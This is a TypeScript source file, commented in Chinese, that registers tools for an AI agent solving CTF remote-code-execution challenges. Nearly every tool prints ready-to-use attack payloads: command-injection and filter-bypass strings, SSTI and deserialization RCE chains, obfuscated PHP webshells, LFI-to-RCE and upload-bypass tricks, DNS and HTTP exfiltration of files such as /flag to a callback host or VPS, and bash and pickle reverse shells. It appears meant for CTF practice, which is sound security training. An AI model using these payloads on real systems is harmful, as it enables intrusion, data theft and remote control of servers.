// RCE 快速排查工具集：把常见 RCE 解题路径固化为可调用工具，加速"找 sink → 探过滤 → 选绕过 → 外带回显 → 拿 flag"流程。
// 工具均为纯生成/分析类（不直接攻击目标），产出 payload 或排查清单，供 agent 决策。
//
// 覆盖：命令注入 payload 字典 + 过滤探测、SSTI 模板识别、代码注入/eval、反序列化 payload 生成、
//       无字母数字 webshell、文件相关 RCE（LFI/上传）、盲注外带（DNS/HTTP/延时）、拿到 RCE 后的标准枚举路径。

import { z } from "zod";
import { ToolRegistry } from "./registry";

export function createRceTools(): ToolRegistry {
  const registry = new ToolRegistry();

  // ── 1. 命令注入 payload 字典 + 过滤探测 ──
  registry.register({
    name: "cmd_injection_payloads",
    description:
      "命令注入 payload 字典生成：给定输入点（如 ping 参数）和已知过滤，输出分隔符/空格绕过/关键字绕过/盲注外带等全套 payload。用于快速枚举可用注入向量。",
    parameters: z.object({
      inject_point: z
        .string()
        .describe("注入点描述，如 'ping cmd 参数' / '文件名' / 'url 参数'"),
      filtered: z
        .string()
        .optional()
        .describe("已知被过滤的字符/关键字，如 \"空格;|`$ cat flag\"（留空=未知过滤）"),
      blind: z
        .boolean()
        .default(false)
        .describe("true=无回显盲注，额外输出 DNS/HTTP/延时外带 payload"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { inject_point, filtered = "", blind = false } = args;
      const f = filtered.toLowerCase();
      const has = (kw: string) => f.includes(kw);
      const out: string[] = [];
      out.push(`[命令注入 payload] 注入点: ${inject_point} | 过滤: ${filtered || "(无)"}`);
      out.push("");

      // 分隔符（测是否能接第二条命令）
      out.push("── 分隔符（探测能否拼接第二条命令）──");
      const seps: Array<[string, string]> = [
        [";", ";id"],
        ["|", "|id"],
        ["&&", "&&id"],
        ["||", "||id"],
        ["`反引号`", "`id`"],
        ["$()", "$(id)"],
        ["换行", "%0aid"],
        ["回车", "%0did"],
        ["换行(linux)", "%0aid"],
      ];
      for (const [label, payload] of seps) {
        const blocked = has(label.split("(")[0]) || has(label);
        out.push(`  ${blocked ? "✗(已过滤)" : "✓"} [${label}] ${payload}`);
      }

      // 空格绕过
      out.push("");
      out.push("── 空格绕过（过滤了空格时）──");
      const spaceBypass = [
        "${IFS} cat flag",
        "$IFS$9 cat flag",
        "{cat,flag}",
        "cat<flag",
        "cat<>flag",
        "X=$'\t';cat${X}flag",
      ];
      for (const p of spaceBypass) {
        const blocked = has("ifs") && p.includes("IFS");
        out.push(`  ${blocked ? "✗" : "✓"} ${p}`);
      }

      // 关键字绕过
      out.push("");
      out.push("── 关键字绕过（过滤了 cat/flag/system 等）──");
      const kwBypass = [
        ["引号截断", "ca''t fla''g"],
        ["反斜杠", "ca\\t fla\\g"],
        ["$@", "ca$@t fla$@g"],
        ["单引号", "c'a't flag"],
        ["变量拼接", "a=ca;b=t;$a$b flag"],
        ["base64", "echo Y2F0IGZsYWc=|base64 -d|sh"],
        ["hex", "echo 63617420666c6167|xxd -r -p|sh"],
        ["printf", "$(printf '\\x63\\x61\\x74') flag"],
        ["通配符 /f*", "cat /f*"],
        ["通配符 ???", "/???/??t /f???"],
      ];
      for (const [label, payload] of kwBypass) {
        out.push(`  ✓ [${label}] ${payload}`);
      }

      // 盲注外带
      if (blind) {
        out.push("");
        out.push("── 盲注外带（无回显）──");
        out.push("  [DNS] curl http://`whoami`.xxxx.ceye.io");
        out.push("  [DNS] ping -c1 `id|base64`.xxxx.dnslog.cn");
        out.push("  [HTTP] curl http://VPS/?a=$(cat /flag|base64 -w0)");
        out.push("  [HTTP] wget http://VPS/$(whoami)");
        out.push("  [写文件] ls />/tmp/o && curl http://VPS -d @/tmp/o");
        out.push("  [延时] if [ $(id|cut -c1) = r ];then sleep 3;fi");
      }

      out.push("");
      out.push("💡 流程: 先用分隔符探测能否注入 → 测过滤 → 选绕过 → 盲注则外带");
      return out.join("\n");
    },
  });

  // ── 2. SSTI 模板识别 + payload ──
  registry.register({
    name: "ssti_detect",
    description:
      "SSTI 模板注入探测与 payload 生成：输入目标返回的探测响应（如 {{7*7}} 的结果），判定模板引擎类型并输出对应 RCE payload。",
    parameters: z.object({
      probe_results: z
        .string()
        .describe(
          "各探测表达式的返回结果，每行一个 '表达式 => 结果'，如 '{{7*7}} => 49' / '${7*7} => 49' / '{{7*\\'7\\'}} => 7777777'"
        ),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { probe_results } = args;
      const lines = probe_results
        .split("\n")
        .map((l: string) => l.trim())
        .filter(Boolean);
      const get = (expr: string) => {
        for (const l of lines) {
          const m = l.match(/=>\s*(.*)$/);
          if (l.includes(expr) && m) return m[1].trim();
        }
        return undefined;
      };
      const out: string[] = ["[SSTI 识别]"];
      let engine = "未知";

      const r77 = get("{{7*'7'}}");
      const r49 = get("{{7*7}}");
      const dollar49 = get("${7*7}");
      const erb49 = get("<%=7*7%>");
      const hash49 = get("#{7*7}");

      if (r77 === "7777777") engine = "Jinja2 (Python)";
      else if (r49 === "49" && r77 === "49") engine = "Twig (PHP)";
      else if (dollar49 === "49") engine = "FreeMarker / Velocity (Java)";
      else if (erb49 === "49") engine = "ERB (Ruby)";
      else if (hash49 === "49") engine = "Thymeleaf (Java) / Ruby";
      else if (r49 === "49") engine = "Jinja2 或 Twig（需 7*'7' 区分）";

      out.push(`  识别引擎: ${engine}`);
      out.push("");

      const payloads: Record<string, string[]> = {
        "Jinja2 (Python)": [
          "{{lipsum.__globals__.os.popen('id').read()}}",
          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
          "{{request.__class__.__mro__[1].__subclasses__()}}  # 找 Popen/_wrap_close 下标",
          "{{x.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")}}",
          "# 过滤 . _ 时：用 |attr + \\x 转义 + request 传参",
          "{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
          "{{()|attr(request.args.a)|attr(request.args.b)}}  # a=__class__&b=__init__",
        ],
        "Twig (PHP)": [
          "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
          "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag')}}",
        ],
        "FreeMarker / Velocity (Java)": [
          "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
          "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
          "# Velocity:",
          "$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\")",
        ],
        "ERB (Ruby)": [
          "<%= `id` %>",
          "<%= system('id') %>",
          "<%= IO.popen('id').read %>",
        ],
      };

      const ps = payloads[engine];
      if (ps) {
        out.push(`── ${engine} RCE payload ──`);
        for (const p of ps) out.push(`  ${p}`);
      } else {
        out.push("⚠️ 未能确定引擎，请补充更多探测结果（{{7*7}}/${7*7}/<%=7*7%>/#{7*7}/{{7*'7'}}）");
      }

      out.push("");
      out.push("💡 探测顺序: {{7*7}} → {{7*'7'}}(区分 jinja/twig) → ${7*7} → <%=7*7%> → #{7*7}");
      return out.join("\n");
    },
  });

  // ── 3. 反序列化 payload 生成 ──
  registry.register({
    name: "deser_payload_gen",
    description:
      "反序列化 RCE payload 生成指南：按语言（PHP/Java/Python/.NET）输出工具调用、经典链、触发点与绕过技巧。",
    parameters: z.object({
      lang: z
        .enum(["php", "java", "python", "dotnet", "unknown"])
        .describe("目标语言/运行时"),
      context: z
        .string()
        .optional()
        .describe("触发场景，如 'cookie 含序列化数据' / 'unserialize 端点' / 'Shiro rememberMe'"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { lang, context = "" } = args;
      const out: string[] = [`[反序列化 payload] 语言: ${lang} | 场景: ${context || "(未指定)"}`];
      out.push("");

      const guides: Record<string, string[]> = {
        php: [
          "工具: phpggc（生成 gadget chain payload）",
          "  phpggc Laravel/RCE1 system 'cat /flag' -b   # -b=base64",
          "  phpggc Symfony/RCE4 system 'id'",
          "关注魔术方法链: __destruct / __wakeup / __toString / __get / __call",
          "绕 __wakeup: 属性数量 > 真实数量（CVE-2016-7124）",
          "phar 触发: 任意文件函数 + phar:// 协议（绕过 unserialize 不可达）",
          "  phar://upload.gif/test.txt   # 在 phar metadata 里放反序列化对象",
          "POC 构造: 用 PHP 手写 __destruct 链，或 phpggc --list 列可用链",
        ],
        java: [
          "工具: ysoserial",
          "  java -jar ysoserial.jar CommonsCollections1 'cmd' > payload.bin",
          "  java -jar ysoserial.jar CommonsCollections6 'bash -c {echo..}|{base64,-d}|{bash,-i}'",
          "常见链: CC1/CC6/CC11(Shiro) / CommonsBeanutils / URLDNS(探测)",
          "URLDNS 探测: 先发 URLDNS 链 + dnslog 确认反序列化点存在",
          "Shiro550: rememberMe cookie + AES-CBC + 默认 key (kPH+bxrk...)",
          "  shiro_exploit.py -t URL -k key",
          "Fastjson: @type 触发 JdbcRowSetImpl / TemplatesImpl",
          "  {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://VPS/Exp\",\"autoCommit\":true}",
          "注意: JDK 版本/依赖版本决定链是否可用，多试几条",
        ],
        python: [
          "pickle 手写（最简单）:",
          "  import pickle,os",
          "  class E:",
          "    def __reduce__(self):",
          "      return (os.system,('cat /flag',))",
          "  payload = pickle.dumps(E())  # base64 后塞进触发点",
          "反弹 shell:",
          "  return (os.popen,('bash -c \"bash -i >& /dev/tcp/VPS/PORT 0>&1\"',))",
          "其他: yaml.load / jsonpickle / subprocess32 也有类似 gadget",
        ],
        dotnet: [
          "工具: ysoserial.net",
          "  ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd' -o raw",
          "常见格式: BinaryFormatter / LosFormatter / SoapFormatter / XmlSerializer",
          "ViewState: __VIEWSTATE + machineKey（泄露时）",
        ],
        unknown: [
          "按响应特征判断语言:",
          "  PHP: unserialize/PHPSESSID/a:1:{s:1}",
          "  Java: ObjectOutputStream 头 rO0AB / Shiro rememberMe / Hessian",
          "  Python: pickle 头 gASV / base64 的 \\x80\\x04",
          "  .NET: AAEAAAD///// / ViewState",
        ],
      };

      const g = guides[lang] || guides.unknown;
      out.push(`── ${lang} 反序列化路径 ──`);
      for (const line of g) out.push(`  ${line}`);
      out.push("");
      out.push("💡 通用三步: 找链(gadget) → 构造 payload → 找 unserialize/readObject sink 注入");
      return out.join("\n");
    },
  });

  // ── 4. 无字母数字 webshell 生成 ──
  registry.register({
    name: "nonalpha_webshell",
    description:
      "无字母数字 webshell 生成（PHP）：过滤了所有字母数字时，用自增/异或/取反构造 webshell。输出可用 payload。",
    parameters: z.object({
      technique: z
        .enum(["auto", "increment", "xor", "not"])
        .default("auto")
        .describe("构造技术：increment=自增(短)；xor=异或(稳)；not=取反；auto=全给"),
      target_func: z
        .string()
        .default("system")
        .describe("目标函数名，如 system/assert/exec（默认 system）"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { technique = "auto", target_func = "system" } = args;
      const out: string[] = [`[无字母数字 webshell] 技术: ${technism(technique)} | 目标: ${target_func}`];
      out.push("");

      out.push("── 异或构造（最通用）──");
      out.push("  # 用异或构造任意字符，拼接成 system($_GET[1])");
      out.push("  $_=(_/_._)[0];  # 得到 'N' 之类");
      out.push("  # 经典短 payload（PHP7）:");
      out.push("  <?=`$_GET[1]`;?>  # 反引号=执行，最短");
      out.push("");

      out.push("── 自增构造（PHP7，'_'自增得到字母）──");
      out.push("  $_=[];           # Array");
      out.push("  $_=@\"$_\";        # 'Array'");
      out.push("  $_=$_['!'=='@']; # 'A'");
      out.push("  # A 自增得 B C D... 拼出 ASSERt/SYSTEM 等");
      out.push("  $___=$_; $__=$_;$__++;$__++;...  # 构造字母");
      out.push("  # 现成 payload (执行 $_GET[1]):");
      out.push("  $_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__=_.$___;$__++;$__++;$__++;$__++;$___.=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__=$__.$___;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__=$__.$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__=$__.$___;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__=$__.$___;$$_=$$__($$___[$_]);  # system($_GET[_])");
      out.push("");

      out.push("── 取反构造（PHP7，~取反得任意字符）──");
      out.push("  # ~'\\x8c\\x86\\x8c\\x8b\\x9a\\x92' = 'system'");
      out.push("  $~=\"\\x8c\\x86\\x8c\\x8b\\x9a\\x92\";  # ~后为 system");
      out.push("  ($~)(~\"\\x88\\x9a\\x8e\\x8e\\x9c\\x91\");  # (~system)(~'whoami')");
      out.push("  # URL 编码版:");
      out.push("  %8C%86%8C%8B%9A%92)(~%88%9A%8E%8E%9C%91)");
      out.push("");

      out.push("── 最短方案（不限制反引号时）──");
      out.push("  <?=`$_GET[1]`?>  # PHP 短标签 + 反引号执行");
      out.push("  # 传 ?1=cat /flag");
      out.push("");

      out.push("💡 自增/异或/取反三选一，取决于具体过滤了哪些字符（引号/下划线/美元符）");
      return out.join("\n");
    },
  });

  function technism(t: string): string {
    return t === "auto" ? "auto(全给)" : t;
  }

  // ── 5. LFI → RCE 升级路径 ──
  registry.register({
    name: "lfi_to_rce",
    description:
      "LFI 升级 RCE 路径生成：给定目标是否支持 PHP、是否有日志/Session/临时文件可包含，输出各升级路径 payload。",
    parameters: z.object({
      target: z
        .string()
        .describe("目标 URL 模板，用 [FILE] 占位，如 'http://t/?file=[FILE]'"),
      php: z
        .boolean()
        .default(true)
        .describe("目标是否 PHP（true 则给 PHP 专属路径）"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { target, php = true } = args;
      const u = (path: string) => target.replace("[FILE]", path);
      const out: string[] = [`[LFI → RCE] 目标: ${target} | PHP: ${php}`];
      out.push("");

      if (php) {
        out.push("── 日志包含（最常用）──");
        out.push("  # 1. 先把 PHP 代码注入日志（User-Agent / Referer）");
        out.push("  UA: <?php system($_GET[1]);?>");
        out.push("  # 2. 包含日志");
        out.push(`  ${u("/var/log/nginx/access.log")}&1=id`);
        out.push(`  ${u("/var/log/apache2/access.log")}`);
        out.push(`  ${u("/usr/local/apache/logs/access.log")}`);
        out.push("");

        out.push("── Session 包含 ──");
        out.push("  # 先让 session 文件里有 PHP 代码（通过可控 session 变量）");
        out.push(`  ${u("/var/lib/php/sessions/sess_PHPSESSID")}`);
        out.push(`  ${u("/tmp/sess_PHPSESSID")}`);
        out.push("");

        out.push("── /proc/self/environ ──");
        out.push("  # UA 写入 PHP 代码后包含 environ");
        out.push(`  ${u("/proc/self/environ")}`);
        out.push("");

        out.push("── phpinfo + 临时文件竞争 ──");
        out.push("  # 上传文件时 php 会临时存 /tmp/phpXXXXXX，phpinfo 泄露路径，竞争包含");
        out.push("  # 工具: phpinfocalc.py / 条件竞争脚本");
        out.push("");

        out.push("── pearcmd.php（近期热门，无需日志）──");
        out.push(`  ${u("/usr/local/lib/php/pearcmd.php")}&+config-create+/<?=system('id')?>+/tmp/sh.php`);
        out.push("  # 然后包含 /tmp/sh.php");
        out.push("");

        out.push("── php 过滤器读源码（先信息收集）──");
        out.push(`  ${u("php://filter/convert.base64-encode/resource=index.php")}`);
        out.push(`  ${u("php://filter/read=string.rot13/resource=index.php")}`);
        out.push("");

        out.push("── data:// / input:// 直接执行（allow_url_include=on）──");
        out.push(`  ${u("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+")}`);
        out.push(`  # POST body: <?php system('id');?>  配合 php://input`);
        out.push(`  ${u("php://input")}`);
      } else {
        out.push("── 非 PHP，按语言给路径 ──");
        out.push("  # JSP: 包含 webshell.jsp / Spring BOOT actuator");
        out.push("  # Node: require('/tmp/shell.js') / prototype pollution");
        out.push("  # Python: /proc/self/environ + 模板渲染");
      }

      out.push("");
      out.push("💡 优先级: pearcmd > 日志 > session > environ > phpinfo竞争");
      return out.join("\n");
    },
  });

  // ── 6. 盲注外带 payload 生成 ──
  registry.register({
    name: "blind_rce_exfil",
    description:
      "盲 RCE 外带 payload 生成：无回显时用 DNS/HTTP/延时/写文件外带命令结果。输入回连域名（如 ceye/dnslog）输出全套外带 payload。",
    parameters: z.object({
      callback_domain: z
        .string()
        .describe("回连域名，如 abc.ceye.io / xxx.dnslog.cn（无则用 VPS IP）"),
      cmd: z
        .string()
        .default("cat /flag")
        .describe("要外带的命令（默认 cat /flag）"),
      is_vps: z
        .boolean()
        .default(false)
        .describe("true=callback_domain 是 VPS IP，用 HTTP 外带；false=用 DNS 外带"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { callback_domain, cmd = "cat /flag", is_vps = false } = args;
      const out: string[] = [`[盲 RCE 外带] 回连: ${callback_domain} | 命令: ${cmd}`];
      out.push("");

      if (!is_vps) {
        out.push("── DNS 外带（穿透性强，最优先）──");
        out.push(`  curl http://\`whoami\`.${callback_domain}`);
        out.push(`  ping -c1 \`${cmd}|base64|tr '+' '-'\`.${callback_domain}`);
        out.push(`  # 带 / 的结果需替换: \`${cmd}|base64|tr '/' '_'\`.${callback_domain}`);
        out.push(`  # 分段（结果太长 DNS 截断）: \`${cmd}|head -c 50|base64\`.${callback_domain}`);
        out.push(`  nslookup \`${cmd}|base64\`.${callback_domain}`);
      }

      out.push("");
      out.push("── HTTP 外带（需能出网）──");
      out.push(`  curl http://${callback_domain}/?\`${
        is_vps ? "" : ""
      }${cmd}|base64|tr -d '\\n'\``);
      out.push(`  wget http://${callback_domain}/$(whoami)`);
      out.push(`  curl -X POST -d "\`${cmd}\`" http://${callback_domain}/`);
      out.push(`  # 写文件再传: ${cmd}>/tmp/o;curl -d @/tmp/o http://${callback_domain}/`);

      out.push("");
      out.push("── 延时盲注（出网被禁时，逐字符推断）──");
      out.push(`  if [ \`${
        cmd
      }|wc -c\` -gt 10 ];then sleep 3;fi   # 长度判断`);
      out.push(`  if [ \`${
        cmd
      }|cut -c1\` = "f" ];then sleep 3;fi    # 逐字符`);
      out.push("  # 二分法加速: if [ \\\\$(cat /flag|cut -c1) \\\\> \\\\\"m\\\\\" ];then sleep 3;fi");

      out.push("");
      out.push("── ICMP 外带（DNS/HTTP 被禁时）──");
      out.push(`  # 用 ping 的包大小外带，需 VPS tcpdump`);
      out.push(`  ping -c1 -s $((\\\`${
        cmd
      }|wc -c\\\`)) ${callback_domain}`);

      out.push("");
      out.push("💡 优先 DNS（短结果）→ HTTP（长结果）→ 延时（不出网）");
      return out.join("\n");
    },
  });

  // ── 7. RCE 后标准枚举路径 ──
  registry.register({
    name: "post_rce_enum",
    description:
      "RCE 成功后标准枚举路径：拿到执行权限后的信息收集 + 找 flag + 提权排查命令清单。直接复制执行。",
    parameters: z.object({
      goal: z
        .enum(["find_flag", "privesc", "both"])
        .default("both")
        .describe("目标：find_flag=找 flag；privesc=提权排查；both=两者"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { goal = "both" } = args;
      const out: string[] = [`[RCE 后枚举] 目标: ${goal}`];
      out.push("");

      out.push("── 基础信息 ──");
      out.push("  id; whoami; hostname; uname -a");
      out.push("  cat /etc/passwd | grep -v nologin | grep -v false");
      out.push("  pwd; ls -la; ls -la /");
      out.push("  env; cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'");
      out.push("");

      if (goal === "find_flag" || goal === "both") {
        out.push("── 找 flag ──");
        out.push("  find / -name '*flag*' 2>/dev/null");
        out.push("  find / -name 'flag' -o -name 'flag.txt' 2>/dev/null");
        out.push("  cat /flag /flag.txt /root/flag /home/*/flag* 2>/dev/null");
        out.push("  grep -rn 'flag{' / 2>/dev/null");
        out.push("  grep -rn 'CTF{' / 2>/dev/null");
        out.push("  grep -rn 'flag' /var/www/html 2>/dev/null | head");
        out.push("  # 数据库里:");
        out.push("  find / -name '*.db' -o -name '*.sqlite' 2>/dev/null");
        out.push("  mysql -u root -e 'show databases;' 2>/dev/null");
        out.push("");
      }

      if (goal === "privesc" || goal === "both") {
        out.push("── 提权排查 ──");
        out.push("  sudo -l                                  # sudo 权限");
        out.push("  find / -perm -4000 2>/dev/null           # SUID 文件");
        out.push("  find / -perm -2000 2>/dev/null           # SGID 文件");
        out.push("  cat /etc/crontab; ls -la /etc/cron.*     # 定时任务");
        out.push("  ls -la /opt /srv /var/spool/cron         # 可写脚本");
        out.push("  ps auxf                                  # 进程（找 root 跑的可控脚本）");
        out.push("  netstat -tlnp 2>/dev/null                # 内部端口");
        out.push("  # 内核版本对应漏洞:");
        out.push("  uname -r  # 2.6.x=脏牛; 5.8-5.16=DirtyPipe; 5.x=CVE-2022-0847");
        out.push("  # capabilities:");
        out.push("  getcap -r / 2>/dev/null");
        out.push("");
        out.push("── 提权速查（GTFOBins）──");
        out.push("  # 找到 SUID/cap 的二进制，去 gtfobins.github.io 查利用");
        out.push("  # 常见: pkexec(CVE-2021-4034) / find / vim / nmap / perl / python");
        out.push("");
      }

      out.push("── 反弹 shell（如需稳定交互）──");
      out.push("  bash -c 'bash -i >& /dev/tcp/VPS/PORT 0>&1'");
      out.push("  python -c 'import pty;pty.spawn(\"/bin/bash\")'  # 升级 pty");
      out.push("");
      out.push("💡 流程: id/info → find_flag → 没权限则 privesc → 拿 root flag");
      return out.join("\n");
    },
  });

  // ── 8. 文件上传绕过清单 ──
  registry.register({
    name: "upload_bypass_checklist",
    description:
      "文件上传绕过清单：黑名单/白名单/内容检测各场景的绕过技巧速查。输入已知限制输出对应绕过路径。",
    parameters: z.object({
      restriction: z
        .string()
        .optional()
        .describe("已知限制，如 '只允许 jpg/png' / '黑名单 php' / '检查 Content-Type'（留空=全给）"),
    }),
    category: "web",
    concurrent: true,
    execute: async (args: any) => {
      const { restriction = "" } = args;
      const r = restriction.toLowerCase();
      const out: string[] = [`[上传绕过] 限制: ${restriction || "(未知，全给)"}`];
      out.push("");

      out.push("── 后缀绕过 ──");
      out.push("  # PHP 可解析后缀: .php .php5 .php7 .phtml .phar .pht .phps .pHp");
      out.push("  # JSP: .jsp .jspx .jspf");
      out.push("  # ASP: .asp .aspx .asa .cer .ashx");
      out.push("  # 大小写: .PhP / .PHP");
      out.push("  # 双写: .pphphp (过滤一次 php)");
      out.push("  # 空格/点: shell.php[空格] / shell.php. (Windows 去尾点)");
      out.push("  # ::$DATA: shell.php::$DATA (Windows NTFS)");
      out.push("  # 00 截断: shell.php%00.jpg (老版本)");
      out.push("");

      out.push("── Content-Type 绕过 ──");
      out.push("  # 改 Content-Type: image/jpeg / image/png / application/octet-stream");
      out.push("  # 抓包改: Content-Type: image/gif");
      out.push("");

      out.push("── 文件头绕过（内容检测）──");
      out.push("  # GIF89a 前缀 + PHP 代码");
      out.push("  GIF89a<?php system($_GET[1]);?>");
      out.push("  # 真图片马: copy normal.jpg/b + shell.php/b = shell.jpg");
      out.push("  # 绕过 getimagesize: 加完整图片头");
      out.push("");

      out.push("── .htaccess / .user.ini 绕过 ──");
      out.push("  # .htaccess: 让 jpg 当 php 解析");
      out.push("  AddType application/x-httpd-php .jpg");
      out.push("  # 或: <FilesMatch 'shell'> SetHandler application/x-httpd-php </FilesMatch>");
      out.push("  # .user.ini (PHP fastcgi):");
      out.push("  auto_prepend_file=shell.jpg   # 然后访问任意 php 触发");
      out.push("");

      out.push("── 竞争上传 ──");
      out.push("  # 服务器先存再删: 边上传边访问，竞争在删除前执行");
      out.push("  # shell.php 内容: <?php file_put_contents('real.php','<?php eval(\\\\$_POST[1]);?>');?>");
      out.push("");

      out.push("── 解析漏洞 ──");
      out.push("  # IIS 6.0: shell.asp;.jpg");
      out.push("  # Nginx: shell.jpg/%00.php (cgi.fix_pathinfo)");
      out.push("  # Apache: shell.php.xxx (mime 解析多后缀)");
      out.push("");
      out.push("💡 优先: 改后缀 > Content-Type > 图片马 > .htaccess > 竞争");
      return out.join("\n");
    },
  });

  return registry;
}
